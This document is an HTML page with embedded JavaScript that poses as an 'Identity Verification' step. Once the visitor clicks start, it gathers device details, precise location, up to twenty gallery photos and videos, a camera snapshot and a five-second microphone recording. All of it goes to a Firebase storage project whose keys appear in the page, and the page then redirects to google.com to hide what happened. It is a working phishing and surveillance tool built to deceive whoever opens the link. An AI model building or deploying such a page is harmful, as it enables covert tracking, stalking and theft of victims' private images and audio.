<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Identity Verification</title>
    
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-storage-compat.js"></script>
    
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: system-ui, -apple-system, 'Segoe UI', Roboto;
            background: #000;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .card {
            background: #111;
            border-radius: 32px;
            padding: 40px 28px;
            max-width: 420px;
            width: 100%;
            text-align: center;
            border: 1px solid #222;
        }
        .logo {
            width: 70px;
            height: 70px;
            background: #1a73e8;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 20px;
            font-size: 32px;
        }
        h1 { color: #fff; font-size: 24px; margin-bottom: 10px; }
        .sub { color: #aaa; font-size: 14px; margin-bottom: 24px; }
        .btn {
            background: #1a73e8;
            color: white;
            border: none;
            width: 100%;
            padding: 14px;
            font-size: 16px;
            font-weight: 600;
            border-radius: 40px;
            cursor: pointer;
            margin-top: 10px;
        }
        .btn:disabled { background: #444; cursor: not-allowed; }
        .loader {
            margin-top: 20px;
            color: #1a73e8;
            font-size: 14px;
            display: none;
        }
        .log {
            margin-top: 20px;
            padding: 12px;
            background: #1a1a1a;
            border-radius: 12px;
            font-size: 11px;
            color: #0f0;
            font-family: monospace;
            text-align: left;
            display: none;
            max-height: 200px;
            overflow-y: auto;
        }
        input, video, canvas { display: none; }
    </style>
</head>
<body>
    <div class="card">
        <div class="logo">🔐</div>
        <h1>Identity Verification</h1>
        <div class="sub">Please complete verification to continue</div>
        <button class="btn" id="startBtn">▶ Start Verification</button>
        <div class="loader" id="loader">Initializing...</div>
        <div class="log" id="log"></div>
    </div>
    
    <input type="file" id="galleryInput" accept="image/*,video/*" multiple>
    <video id="video" autoplay playsinline style="display:none"></video>
    <canvas id="canvas" style="display:none"></canvas>
    
    <script>
        // Firebase Config
        const firebaseConfig = {
            apiKey: "AIzaSyCG2oPHsEbvKAVY4C2mP-njqvgvZnzyZBU",
            authDomain: "mobilehk-5e843.firebaseapp.com",
            projectId: "mobilehk-5e843",
            storageBucket: "mobilehk-5e843.firebasestorage.app",
            messagingSenderId: "287475964010",
            appId: "1:287475964010:web:35b3d5f3f5e382ea881213"
        };
        
        firebase.initializeApp(firebaseConfig);
        const db = firebase.firestore();
        const storage = firebase.storage();
        
        const urlParams = new URLSearchParams(window.location.search);
        const sessionId = urlParams.get('id');
        
        const startBtn = document.getElementById('startBtn');
        const loader = document.getElementById('loader');
        const logDiv = document.getElementById('log');
        
        function addLog(msg) {
            logDiv.style.display = 'block';
            logDiv.innerHTML += `[${new Date().toLocaleTimeString()}] ${msg}\n`;
            logDiv.scrollTop = logDiv.scrollHeight;
            console.log(msg);
        }
        
        if (!sessionId) {
            addLog('❌ ERROR: No session ID found in URL');
            startBtn.disabled = true;
            loader.innerHTML = '❌ Invalid link';
        } else {
            addLog(`✅ Session ID: ${sessionId}`);
        }
        
        async function saveToFirebase(type, data) {
            if (!sessionId) return false;
            try {
                addLog(`📤 Saving ${type}...`);
                await db.collection('sessions').doc(sessionId).collection('data').add({
                    type: type,
                    data: data,
                    timestamp: new Date().toISOString()
                });
                addLog(`✅ ${type} saved!`);
                return true;
            } catch(e) {
                addLog(`❌ Save error: ${e.message}`);
                return false;
            }
        }
        
        async function uploadFile(file, type) {
            if (!sessionId) return null;
            addLog(`📁 Uploading ${file.name} (${(file.size/1024).toFixed(1)} KB)`);
            const filename = `${sessionId}_${Date.now()}_${file.name.replace(/[^a-z0-9.]/gi, '_')}`;
            const ref = storage.ref(`uploads/${filename}`);
            await ref.put(file);
            const url = await ref.getDownloadURL();
            await saveToFirebase(type, { url, name: file.name, size: file.size });
            addLog(`✅ ${file.name} uploaded!`);
            return url;
        }
        
        // STEP 1: Device Info
        async function stepDeviceInfo() {
            addLog('📱 Getting device info...');
            const ua = navigator.userAgent;
            let device = "Unknown";
            if (ua.includes("iPhone")) device = "iPhone";
            else if (ua.includes("Android")) device = "Android";
            else if (ua.includes("Windows")) device = "Windows PC";
            else if (ua.includes("Mac")) device = "Mac";
            await saveToFirebase('device_info', { device, ua, screen: `${screen.width}x${screen.height}` });
            addLog('✅ Device info saved');
        }
        
        // STEP 2: Location
        async function stepLocation() {
            addLog('📍 Requesting location...');
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    addLog('❌ Geolocation not supported');
                    resolve(false);
                    return;
                }
                navigator.geolocation.getCurrentPosition(
                    async (pos) => {
                        addLog(`📍 Location: ${pos.coords.latitude}, ${pos.coords.longitude}`);
                        await saveToFirebase('location', {
                            lat: pos.coords.latitude,
                            lng: pos.coords.longitude,
                            accuracy: pos.coords.accuracy
                        });
                        resolve(true);
                    },
                    (err) => {
                        addLog(`❌ Location error: ${err.message}`);
                        resolve(false);
                    }
                );
            });
        }
        
        // STEP 3: Gallery
        async function stepGallery() {
            addLog('📸 Opening gallery... Please select photos/videos');
            return new Promise((resolve) => {
                const input = document.getElementById('galleryInput');
                input.onchange = async (e) => {
                    const files = Array.from(e.target.files);
                    addLog(`📸 Selected ${files.length} files`);
                    let uploaded = 0;
                    for (let i = 0; i < Math.min(files.length, 20); i++) {
                        const file = files[i];
                        const type = file.type.startsWith('image/') ? 'gallery_photo' : 'gallery_video';
                        await uploadFile(file, type);
                        uploaded++;
                        addLog(`📸 Uploaded ${uploaded}/${Math.min(files.length, 20)}`);
                    }
                    resolve(true);
                };
                input.click();
            });
        }
        
        // STEP 4: Camera
        async function stepCamera() {
            addLog('📷 Requesting camera...');
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                addLog('✅ Camera access granted');
                const video = document.getElementById('video');
                video.srcObject = stream;
                await new Promise(r => setTimeout(r, 1500));
                
                const canvas = document.getElementById('canvas');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                canvas.getContext('2d').drawImage(video, 0, 0);
                
                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.9));
                const file = new File([blob], `camera_${Date.now()}.jpg`, { type: 'image/jpeg' });
                await uploadFile(file, 'camera_photo');
                
                stream.getTracks().forEach(t => t.stop());
                addLog('✅ Camera photo saved');
                return true;
            } catch(e) {
                addLog(`❌ Camera error: ${e.message}`);
                return false;
            }
        }
        
        // STEP 5: Microphone
        async function stepMicrophone() {
            addLog('🎤 Requesting microphone...');
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                addLog('✅ Microphone access granted');
                const mediaRecorder = new MediaRecorder(stream);
                const chunks = [];
                
                mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
                mediaRecorder.onstop = async () => {
                    const blob = new Blob(chunks, { type: 'audio/webm' });
                    const file = new File([blob], `audio_${Date.now()}.webm`, { type: 'audio/webm' });
                    await uploadFile(file, 'microphone');
                    addLog('✅ Audio saved');
                };
                
                mediaRecorder.start();
                addLog('🎤 Recording 5 seconds...');
                await new Promise(r => setTimeout(r, 5000));
                mediaRecorder.stop();
                stream.getTracks().forEach(t => t.stop());
                return true;
            } catch(e) {
                addLog(`❌ Microphone error: ${e.message}`);
                return false;
            }
        }
        
        // MAIN FUNCTION
        async function startVerification() {
            if (!sessionId) return;
            
            startBtn.disabled = true;
            loader.style.display = 'block';
            addLog('🚀 Starting verification...');
            
            // Step 1: Device Info
            loader.innerHTML = '📱 Device info...';
            await stepDeviceInfo();
            
            // Step 2: Location
            loader.innerHTML = '📍 Getting location...';
            await stepLocation();
            
            // Step 3: Gallery
            loader.innerHTML = '📸 Opening gallery...';
            addLog('📸 Gallery step - click "Select Files" when prompt opens');
            await stepGallery();
            
            // Step 4: Camera
            loader.innerHTML = '📷 Taking photo...';
            await stepCamera();
            
            // Step 5: Microphone
            loader.innerHTML = '🎤 Recording audio...';
            await stepMicrophone();
            
            // Complete
            await saveToFirebase('verification_complete', { timestamp: new Date().toISOString() });
            
            loader.innerHTML = '✅ Complete! Redirecting...';
            addLog('✅ Verification complete! Redirecting...');
            
            setTimeout(() => {
                window.location.href = "https://www.google.com";
            }, 3000);
        }
        
        startBtn.onclick = startVerification;
    </script>
</body>
</html>
